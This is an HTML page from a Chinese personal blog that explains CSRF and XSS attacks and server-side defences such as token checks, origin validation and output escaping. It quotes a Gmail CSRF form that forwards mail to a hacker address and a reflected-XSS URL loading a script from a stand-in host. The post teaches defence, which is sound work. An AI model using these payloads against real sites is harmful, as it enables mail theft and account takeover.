@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="ch">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="theme-color" content=#58b77a>
+  <title>服务器安全校验 | ROBIN-3910</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="author" content="rob_曾洛镔">
+  <meta name="keywords" content="">
+  <meta name="description" content="rob的个人博客网站，记录编码/学习/生活日常">
+  <script id="hexo-configurations">
+  var CONFIG = {
+    root: '/',
+    theme: 'lx',
+    version: '0.3.9',
+    localsearch: {
+      "enable": 'false',
+      "trigger": "auto",
+      "top_n_per_article": "1",
+      "unescape": 'false',
+      "preload": 'false'
+    },
+    path: '-'
+  };
+</script>
+
+  <link rel="shortcut icon" href="/favicon.ico">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/theme-lx@0.3.9/source/css/main.min.css">
+  <style type="text/css">
+    pre,
+    code {
+      font-family: 'Fira Code', monospace;
+    }
+    html {
+      font-family: sans-serif;
+    }
+    body {
+      font-family: sans-serif;
+    }
+    h1, h2, h3, h4, h5, figure {
+      font-family: sans-serif;
+    }
+    .menu-container{
+      font-family: sans-serif;
+    }
+  </style>
+
+  <script src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/theme-lx@0.3.9/source/js/jquery.jside.menu.js"></script>
+	<script>
+	$(document).ready(function(){
+	$(".menu-container").jSideMenu({
+	    jSidePosition: "position-right",
+	    jSideSticky: true,
+	    jSideSkin: "greenish",
+	     });
+	}); 
+	</script>
+  
+  <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Fira Code:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4/css/font-awesome.min.css">
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+<div class="single">
+
+<div id="page">
+<div id="lx-aside" style="background-image: url(//cdn.jsdelivr.net/npm/theme-lx@0.3.9/source/images/post_cover.jpeg)" data-stellar-background-ratio="0.5">
+  <div class="overlay">
+  <div class="page-title">
+    <div class="avatar"><a href="/"><img style="width: 100px;height: 100px;" src="/images/avatar.jpeg"></a></div>
+    <span>2021-05-11</span>
+    <h2>服务器安全校验</h2>
+    <div class="tags"><i class="fa fa-tag"></i><a class="tag-none-link" href="/tags/CSRF%E3%80%81XSS%E3%80%81%E5%AE%89%E5%85%A8%E6%A0%A1%E9%AA%8C/" rel="tag">CSRF、XSS、安全校验</a></div>
+    <div class="social-links">
+    <a href="https://github.com/Robin3910" target="_blank"><i class="fa fa-github fa-fw"></i></a>
+    <a href="robin3910@163.com" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
+</div></div>
+</div>
+</div>
+
+<div id="lx-main-content">
+  <div class="lx-post">
+    <div class="lx-entry padding">
+      <div>
+        <h2 id="前言介绍"><a href="#前言介绍" class="headerlink" title="前言介绍"></a>前言介绍</h2><p>服务器如果对所有请求内容一并接收的话，很容易带来很多安全风险问题，比如<code>CSRF</code>攻击、<code>XSS</code>攻击。所以，服务端的安全校验尤为重要，<br>不仅保障了服务的稳定性，也保证了用户的利益不受侵犯。</p>
+<h2 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a>常见漏洞</h2><h3 id="CSRF攻击（Cross-site-request-forgery跨站请求伪造）"><a href="#CSRF攻击（Cross-site-request-forgery跨站请求伪造）" class="headerlink" title="CSRF攻击（Cross site request forgery跨站请求伪造）"></a>CSRF攻击（Cross site request forgery跨站请求伪造）</h3><p><code>CSRF</code>攻击实例 - gmail邮箱的<code>CSRF</code>漏洞<br>这一天，大卫同学百无聊赖地刷着Gmail邮件。大部分都是没营养的通知、验证码、聊天记录之类。但有一封邮件引起了大卫的注意：</p>
+<pre><code>甩卖比特币，一个只要998！！
+</code></pre>
+<p>聪明的大卫当然知道这种肯定是骗子，但还是抱着好奇的态度点了进去（请勿模仿）。</p>
+<p>果然，这只是一个什么都没有的空白页面，大卫失望的关闭了页面。一切似乎什么都没有发生……</p>
+<p>在这平静的外表之下，黑客的攻击已然得手。大卫的Gmail中，被偷偷设置了一个过滤规则，这个规则使得所有的邮件都会被自动转发到<code>hacker@hackermail.com</code>。</p>
+<p>大卫还在继续刷着邮件，殊不知他的邮件正在一封封地，如脱缰的野马一般地，持续不断地向着黑客的邮箱转发而去。</p>
+<p>不久之后的一天，大卫发现自己的域名已经被转让了。懵懂的大卫以为是域名到期自己忘了续费，直到有一天，对方开出了 $650 的赎回价码，大卫才开始觉得不太对劲。</p>
+<p>大卫仔细查了下域名的转让，对方是拥有自己的验证码的，而域名的验证码只存在于自己的邮箱里面。大卫回想起那天奇怪的链接，打开后重新查看了“空白页”的源码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">action</span>=<span class="string">&quot;https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;cf2_emc&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;cf2_email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker@hakermail.com&quot;</span>/&gt;</span></span><br><span class="line">      .....</span><br><span class="line">       <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;irf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;on&quot;</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;nvp_bu_cftb&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Create Filter&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.forms[<span class="number">0</span>].submit();</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<pre><code>这个页面只要打开，就会向Gmail发送一个`post`请求。请求中，执行了“`Create Filter`”命令，将所有的邮件，转发    
+到“`hacker@hackermail.com`”。
+</code></pre>
+<p>大卫由于刚刚就登陆了Gmail，所以这个请求发送时，携带着大卫的登录凭证（<code>Cookie</code>），</p>
+<p>Gmail的后台接收到请求，验证了确实有大卫的登录凭证，于是成功给大卫配置了过滤器。</p>
+<p>黑客可以查看大卫的所有邮件，包括邮件里的域名验证码等隐私信息。拿到验证码之后，黑客就可以要求域名服务商把域名重置给自己。</p>
+<p>大卫很快打开Gmail，找到了那条过滤器，将其删除。然而，已经泄露的邮件，已经被转让的域名，再也无法挽回了……</p>
+<p>以上就是大卫的悲惨遭遇。而“点开一个黑客的链接，所有邮件都被窃取”这种事情并不是杜撰的，<br>此事件原型是2007年Gmail的<code>CSRF</code>漏洞：<br><a target="_blank" rel="noopener" href="https://www.davidairey.com/google-Gmail-security-hijack/">Google’s Gmail security failure leaves my business sabotaged</a></p>
+<h3 id="CSRF攻击的特点"><a href="#CSRF攻击的特点" class="headerlink" title="CSRF攻击的特点"></a>CSRF攻击的特点</h3><p>攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的凭证，达到冒充用户对被攻击的网站执行某项操作的目的。</p>
+<ul>
+<li><p>攻击一般发起在第三方网站，而不是被攻击的网站。被攻击的网站无法防止攻击发生。</p>
+</li>
+<li><p>攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作；而不是直接窃取数据。</p>
+</li>
+<li><p>整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用”。</p>
+</li>
+<li><p>跨站请求可以用各种方式：图片<code>URL</code>、超链接、<code>CORS</code>、<code>Form</code>提交等等。部分请求方式可以直接嵌入在第三方论坛、文章中，难以进行追踪。</p>
+</li>
+</ul>
+<h2 id="XSS攻击（Cross-site-scripting-跨站脚本攻击）"><a href="#XSS攻击（Cross-site-scripting-跨站脚本攻击）" class="headerlink" title="XSS攻击（Cross site scripting 跨站脚本攻击）"></a>XSS攻击（Cross site scripting 跨站脚本攻击）</h2><h3 id="XSS攻击实例-新浪微博名人堂反射型-XSS漏洞"><a href="#XSS攻击实例-新浪微博名人堂反射型-XSS漏洞" class="headerlink" title="XSS攻击实例 - 新浪微博名人堂反射型 XSS漏洞"></a>XSS攻击实例 - 新浪微博名人堂反射型 XSS漏洞</h3><p>攻击者发现 <a target="_blank" rel="noopener" href="http://weibo.com/pub/star/g/xyyyd">http://weibo.com/pub/star/g/xyyyd</a> 这个 <code>URL</code>的内容未经过滤直接输出到<code>HTML</code> 中。</p>
+<p>于是攻击者构建出一个<code> URL</code>，然后诱导用户去点击：</p>
+<pre><code>http://weibo.com/pub/star/g/xyyyd&quot;&gt;&lt;script src=//xxxx.cn/image/t.js&gt;&lt;/script&gt;
+</code></pre>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://weibo.com/pub/star/g/xyyyd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">//xxxx.cn/image/t.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    &quot;&gt;按分类检索</span><br><span class="line">  <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>浏览器接收到响应后就会加载执行恶意脚本<code>//xxxx.cn/image/t.js</code>，在恶意脚本中利用用户的登录状态进行关注、发微博、发私信等操作，发出的微博和私信可再带上攻击<code>URL</code>，诱导更多人点击，不断放大攻击范围。这种窃用受害者身份发布恶意内容，层层放大攻击范围的方式，被称为“<code>XSS蠕虫</code>”。</p>
+<h3 id="XSS攻击的特点"><a href="#XSS攻击的特点" class="headerlink" title="XSS攻击的特点"></a>XSS攻击的特点</h3><p> <code>Cross-Site Scripting</code>（跨站脚本攻击）简称<code> XSS</code>，是一种代码注入攻击。攻击者通过在目标网站上注入恶意脚本，<br>使之在用户的浏览器上运行。利用这些恶意脚本，攻击者可获取用户的敏感信息如<code>Cookie</code>、<code>SessionID</code> 等，进而危害数据安全。</p>
+<p><code>XSS</code> 的本质是：恶意代码未经过滤，与网站正常的代码混在一起；浏览器无法分辨哪些脚本是可信的，导致恶意脚本被执行。</p>
+<ul>
+<li><p>在 <code>HTML</code> 中内嵌的文本中，恶意内容以 script 标签形成注入。</p>
+</li>
+<li><p>在内联的 <code>JavaScript </code>中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。</p>
+</li>
+<li><p>在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。</p>
+</li>
+<li><p>在标签的 <code>href</code>、<code>src</code> 等属性中，包含 <code>javascript:</code> 等可执行代码。</p>
+</li>
+<li><p>在 <code>onload</code>、<code>onerror</code>、<code>onclick</code> 等事件中，注入不受控制代码。</p>
+</li>
+</ul>
+<h3 id="XSS攻击的分类"><a href="#XSS攻击的分类" class="headerlink" title="XSS攻击的分类"></a><code>XSS</code>攻击的分类</h3><h4 id="存储型XSS（数据库注入恶意代码，危害最大）"><a href="#存储型XSS（数据库注入恶意代码，危害最大）" class="headerlink" title="存储型XSS（数据库注入恶意代码，危害最大）"></a>存储型<code>XSS</code>（数据库注入恶意代码，危害最大）</h4><ol>
+<li>攻击者将恶意代码提交到目标网站的数据库中。</li>
+<li>用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 <code>HTML</code> 中返回给浏览器。</li>
+<li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li>
+<li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li>
+</ol>
+<p>这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。</p>
+<h4 id="反射型XSS（url-参数嵌入恶意代码）"><a href="#反射型XSS（url-参数嵌入恶意代码）" class="headerlink" title="反射型XSS（url`参数嵌入恶意代码）"></a>反射型XSS<code>（</code>url`参数嵌入恶意代码）</h4><ol>
+<li>攻击者构造出特殊的 <code>URL</code>，其中包含恶意代码。</li>
+<li>用户打开带有恶意代码的 <code>URL</code> 时，网站服务端将恶意代码从 <code>URL</code> 中取出，拼接在 <code>HTML</code> 中返回给浏览器。</li>
+<li>用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。</li>
+<li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li>
+</ol>
+<p>反射型 <code>XSS</code> 漏洞常见于通过 <code>URL</code> 传递参数的功能，如网站搜索、跳转等。</p>
+<h4 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS "></a><code>DOM</code> 型 <code>XSS </code></h4><ol>
+<li>攻击者构造出特殊的 <code>URL</code>，其中包含恶意代码。</li>
+<li>用户打开带有恶意代码的 <code>URL</code>。</li>
+<li>用户浏览器接收到响应后解析执行，前端 <code>JavaScript</code> 取出 <code>URL</code> 中的恶意代码并执行。</li>
+<li>恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</li>
+</ol>
+<p><code>DOM</code> 型 <code>XSS</code> 跟前两种 <code>XSS</code> 的区别：<code>DOM</code> 型 <code>XSS</code> 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 <code>JavaScript</code> 自身的安全漏洞，<br>而其他两种 <code>XSS</code> 都属于服务端的安全漏洞。</p>
+<h2 id="服务器安全校验设计"><a href="#服务器安全校验设计" class="headerlink" title="服务器安全校验设计"></a>服务器安全校验设计</h2><h3 id="针对CSRF的防御策略"><a href="#针对CSRF的防御策略" class="headerlink" title="针对CSRF的防御策略"></a>针对<code>CSRF</code>的防御策略</h3><h4 id="1、同源验证防御"><a href="#1、同源验证防御" class="headerlink" title="1、同源验证防御"></a>1、同源验证防御</h4><p>可以通过阻止不明外域的访问来防御<code>CSRF</code>攻击，在<code>HTTP</code>协议中，每一个请求都会携带<code>Header</code>，<code>Header</code>中有字段用于标记域名来源：</p>
+<ul>
+<li><p>Origin Header</p>
+</li>
+<li><p>Referer Header</p>
+</li>
+</ul>
+<h5 id="Origin-Header"><a href="#Origin-Header" class="headerlink" title="Origin Header"></a>Origin Header</h5><p>通过第三方域名发起的请求中，<code>Request Header</code>中的<code>Origin</code>字段指向了第三方域名，如果Origin<br>Header存在，服务端可以根据请求中的<code>Origin</code>字段进行判断该请求是否正常，如果来自于第三方站点，则拒绝该请求。</p>
+<h5 id="Referer-Header"><a href="#Referer-Header" class="headerlink" title="Referer Header"></a>Referer Header</h5><p>在<code>HTTP Request Header</code>中有一个字段叫<code>Referer</code>，记录了该HTTP请求的来源地址。 对于<code>Ajax</code>请求，图片和<code>script</code>等资源请求，<code>Referer</code>为发起请求的页面地址。</p>
+<p>由于<code>Origin</code>在请求头中不一定存在，<code>Referer</code>在某些情况下也是可以伪造或隐藏的，</p>
+<p>所以，如果在请求头中，<code>Origin</code>以及<code>Referer</code>两个字段都不存在或者存在问题时，建议直接拒绝该请求。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">以上所说的CSRF攻击属于第三方域名发起的攻击，通过同源验证也可以防范掉绝大部分的第三方域名CSRF攻击，但这并不是万无一失的。针对于本域直接发起的CSRF，比如攻击者有权限在页面下发布评论（比如链接、图片、富文本等，统称UGC：User Generated Content），那么就可以直接在本域发起攻击，这种情况下同源验证并不能抵御，所以需要服务端对关键接口做额外的防御措施。</span><br></pre></td></tr></table></figure>
+
+<h4 id="2、使用Token"><a href="#2、使用Token" class="headerlink" title="2、使用Token"></a>2、使用<code>Token</code></h4><p> <strong>JSP服务端渲染的情况</strong> </p>
+<ul>
+<li><p>将CSRF Token写入页面中<br>可以在客户端请求页面时，生成一个<code>token</code>，该<code>token</code>通过加密算法对数据进行加密（一般包括了随机字符串和时间戳），然后将<code>token</code>写入服务端模板页面<code>form</code>标签和<code>a</code>标签中，再下发给客户端</p>
+</li>
+<li><p>页面发送请求时携带<code>token </code></p>
+<p>客户端在发送请求时，会带上<code>token</code>标签，这是第三方域名发起请求无法做到的，比如：</p>
+<p><code>get</code>请求：<a target="_blank" rel="noopener" href="http://url/?csrftoken=tokenvalue">http://url?csrftoken=tokenvalue</a></p>
+<p><code>Post</code>请求：由于<code>form</code>表单中有：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrftoken&quot;</span> <span class="attr">value</span>=<span class="string">&quot;tokenvalue&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>服务器验证<code>token</code> </p>
+<p>服务器接收到客户端请求时，从请求中解析出<code>token</code>进行解密，对比加密字符串以及时间戳，如果加密的字符串一致且时间未过期，那么<code>token</code>就是有效的，可以执行相应的业务逻辑</p>
+</li>
+</ul>
+<p><strong>前后端分离的情况</strong> </p>
+<ul>
+<li><p>将<code>token</code>写入<code>cookie</code>中</p>
+</li>
+<li><p>在用户登录时，写入<code>csrf-token</code>到客户端的<code>cookie</code>中，内容可以为随机字符串（如<code>csrfToken = v8g9e4ksfhw</code>）</p>
+</li>
+<li><p>在客户端发起请求时，将<code>cookie</code>中的<code>token</code>值取出，写入请求参数中</p>
+</li>
+<li><p>服务器接收到请求后，对比<code>cookie</code>中的<code>token</code>和请求参数中的<code>token</code>，如果一致，则请求有效，如果请求中<code>token</code>不存在或与<code>cookie</code>中的<code>token</code>不一致，则拒绝请求</p>
+</li>
+</ul>
+<p>利用<code>token</code>防御的原理就在于：第三方域名发起跨站脚本攻击请求时，是通过冒用用户的身份来发起请求，但无法得知这个<code>token</code>，所以也无法在请求中加入<code>token</code>参数，从而实现对<code>CSRF</code>的防御。</p>
+<h4 id="3、二次验证"><a href="#3、二次验证" class="headerlink" title="3、二次验证"></a>3、二次验证</h4><p>在关键请求提交时如转账，要求用户进行二次身份验证，如密码、图片验证码、短信验证码等。</p>
+<h3 id="针对XSS的防御策略"><a href="#针对XSS的防御策略" class="headerlink" title="针对XSS的防御策略"></a>针对XSS的防御策略</h3><pre><code>思考问题：仅在前端做输入校验并进行过滤有用吗？
+</code></pre>
+<h4 id="预防反射型XSS"><a href="#预防反射型XSS" class="headerlink" title="预防反射型XSS"></a>预防反射型XSS</h4><p>该类<code>XSS</code>攻击常发生于服务端下发页面的情况下，服务器读取<code>Url</code>参数然后再写入<code>html</code>下发给浏览器。</p>
+<p>针对于这种情况：</p>
+<ol>
+<li><p>需要对<code>html</code>做足充分的转义</p>
+<p>如果拼接<code>HTML</code>是必要的，就需要采用一些合适的转义库，对<code>HTML</code>模板插入点进行充分的转义</p>
+<p>常用的模板引擎比如<code>ejs</code>、<code>doT.js</code>等，对HTML的转义通常只有一个规则，就是把<code>&amp;&lt;&gt;&quot;&#39;/</code>这些字符转义掉，能起到一定的效果，但还不够完善，需要由开发者自行去补充，做到更加细致的转义策略。</p>
+</li>
+<li><p>可以改成前后端分离的结构，服务器下发静态资源，通过<code>ajax</code>请求拉取数据渲染页面。</p>
+</li>
+</ol>
+<h4 id="预防存储型XSS"><a href="#预防存储型XSS" class="headerlink" title="预防存储型XSS"></a>预防存储型XSS</h4><p>该类<code>XSS</code>攻击通过将恶意代码上传到服务器数据库中，在用户打开页面的时候对页面的代码进行注入，这类攻击常见于评论展示、论坛发帖等页面中。</p>
+<p>针对于该类攻击，最重要的预防策略：</p>
+<pre><code>对用户提交的内容（UGC）进行充分的校验
+并且在取出数据写入页面时进行转义，防止恶意代码直接写入HTML
+</code></pre>
+<p>此外，<code>XSS</code>攻击很多时候用于窃取用户信息，比如直接通过<code>document.cookie</code>进行页面中用户信息<code>cookie</code>的获取，服务端可以通过设置<code>cookie</code>的属性<code>http-only</code>为<code>true</code>，这样便可降低xss攻击带来的危害。</p>
+<h4 id="预防DOM型XSS"><a href="#预防DOM型XSS" class="headerlink" title="预防DOM型XSS"></a>预防DOM型XSS</h4><ul>
+<li><p>在使用 <code>.innerHTML</code>、<code>.outerHTML</code>、<code>document.write()</code> 时要特别小心，不要把不可信的数据作为 <code>HTML</code> 插到页面上，而应尽量使用 <code>.textContent</code>、<code>.setAttribute()</code>等。</p>
+</li>
+<li><p>如果用 <code>Vue</code> 技术栈，不使用 <code>v-html/dangerouslySetInnerHTML</code> 功能，在前端 <code>render</code> 阶段避免 <code>innerHTML</code>、<code>outerHTML</code> 的 <code>XSS</code> 隐患。</p>
+</li>
+</ul>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文对<code>CSRF</code>以及<code>XSS</code>的攻击进行了介绍，并阐述了两种攻击的各自的特点，也提供了一些防御措施。但在真正实践时，应该结合防御策略与自身实际的情况进行综合考虑。网络上没有绝对的安全，只有相对的防御，根据自身系统所需要的安全系数，做出相应的防御措施，在保证不被攻击的同时也能使投入产出比达到最优。</p>
+<h2 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h2><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Origin">Origin</a></p>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Referer">Referer</a></p>
+<p><a target="_blank" rel="noopener" href="https://tech.meituan.com/2018/10/11/fe-security-csrf.html">如何防止CSRF攻击？</a></p>
+<p><a target="_blank" rel="noopener" href="https://tech.meituan.com/2018/09/27/fe-security.html">如何防止XSS攻击？</a></p>
+<p><a target="_blank" rel="noopener" href="https://xss-game.appspot.com/">XXS-GAME</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/YvetteLau/Step-By-Step/issues/18">什么是XSS攻击，XSS攻击可以分为哪几类？如何防范XSS攻击？</a></p>
+
+      </div>
+    </div>
+  </div>
+</div>
+<div class="lx-navigation">
+	<div class="lx-cover prev lx-cover-sm" style="background-image: url(//cdn.jsdelivr.net/npm/theme-lx@0.3.9/source/images/footer-l.jpeg)">
+		<div class="overlay"></div>
+		<a class="copy" href="#">
+			<div class="display-t">
+				<div class="display-tc">
+					<div>
+						<span>Next</span>
+						<h3>No newer post</h3>
+					</div>
+				</div>
+			</div>
+		</a>
+	</div>
+        <div class="lx-cover next lx-cover-sm" style="background-image: url(//cdn.jsdelivr.net/npm/theme-lx@0.3.9/source/images/footer-r.jpeg)">
+		<div class="overlay"></div>
+		<a class="copy" href="/2021/05/10/avlTree/">
+			<div class="display-t">
+				<div class="display-tc">
+					<div>
+						<span>Prev</span>
+						<h3>AVL树TS实现</h3>
+					</div>
+				</div>
+			</div>
+		</a>
+	</div>
+</div>
+
+</div>
+
+<footer>
+  <div>
+  Copyright &copy; 2021.<a href="/">ROBIN-3910</a><br>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme <a href="https://lx.js.org" target="_blank">Lx</a><br>
+  </div>
+</footer>
+
+</div>
+
+<button class="hamburger hamburger--arrow-r" type="button">
+    <div class="hamburger-box">
+      <div class="hamburger-inner"></div>
+    </div>
+</button> 
+<div class="menu visibility">
+  <div class="menu-head">
+    <span class="layer">
+      <div class="col">
+        <div class="row for-pic">
+          <div class="profile-pic">
+            <a href="/"><img src="/images/avatar.jpeg" alt="rob_曾洛镔"/></a>
+          </div>
+        </div>
+        <div class="row for-name">
+          <p>rob_曾洛镔</p>
+          <span class="tagline">祝你暴富🤩</span>
+        </div>
+      </div>
+    </span>
+  </div>
+  <nav class="menu-container">
+  <ul class="menu-items">
+    <li><a href="/"><i class="fa fa-home fa-fw"></i>Home</a></li>
+    <li><a href="/archives/"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+    
+    
+    
+  </ul>
+  </nav>
+</div>
+
+<div class="gototop js-top">
+  <a href="#" class="js-gotop"><i class="fa fa-arrow-up"></i></a>
+</div>
+<script src="//cdn.jsdelivr.net/npm/theme-lx@0.3.9/source/js/jquery.easing.min.js"></script>
+<script>
+(function () {
+	"use strict";
+	var goToTop = function() {
+		$(".js-gotop").on("click", function(event){
+			event.preventDefault();
+			$("html, body").animate({
+				scrollTop: $("html").offset().top
+			}, 500, "easeInOutExpo");
+			return false;
+		});
+		$(window).scroll(function(){
+			var $win = $(window);
+			if ($win.scrollTop() > 200) {
+				$(".js-top").addClass("active");
+			} else {
+				$(".js-top").removeClass("active");
+			}
+		});
+	};
+	$(function(){
+		goToTop();
+	});
+}());
+</script>
+
+
+</body>
+</html>
